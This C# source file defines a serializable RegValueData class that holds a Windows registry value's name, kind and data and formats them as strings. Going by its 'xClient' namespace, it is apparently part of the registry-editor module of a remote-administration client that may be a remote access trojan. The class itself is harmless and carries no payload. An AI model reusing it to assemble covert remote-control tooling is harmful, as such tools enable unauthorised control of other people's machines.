﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Eklentiler;

namespace xClient.KuuhakuÇekirdek.KayıtDefteri
{
    [Serializable]
    public class RegValueData
    {
        public string Name { get; set; }
        public RegistryValueKind Kind { get; set; }
        public object Data { get; set; }

        public RegValueData(string name, RegistryValueKind kind, object data)
        {
            Name = name;
            Kind = kind;
            Data = data;
        }

        public string GetDataAsString()
        {
            return Kind.RegistryTypeToString(Data);
        }

        public string GetKindAsString()
        {
            return Kind.RegistryTypeToString();
        }

        public override string ToString()
        {
            return string.Format("({0}:{1}:{2})", Name, GetKindAsString(), GetDataAsString());
        }
    }
}
